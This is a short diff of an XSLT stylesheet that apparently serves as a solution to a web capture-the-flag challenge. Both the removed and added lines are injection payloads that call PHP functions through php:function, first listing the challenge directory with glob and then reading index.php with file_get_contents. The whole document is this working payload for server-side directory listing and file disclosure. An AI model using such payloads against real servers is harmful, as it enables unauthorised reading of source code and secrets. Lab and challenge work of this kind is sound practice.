@@ -5,7 +5,7 @@
   <xsl:output method="html"/>
   <xsl:template match="/">
     <pre>
-<xsl:value-of select="php:function('json_encode', php:function('glob', '/challenge/web-serveur/ch50/*'))"/>
+<xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/index.php')"/>
     </pre>
   </xsl:template>
 </xsl:stylesheet>
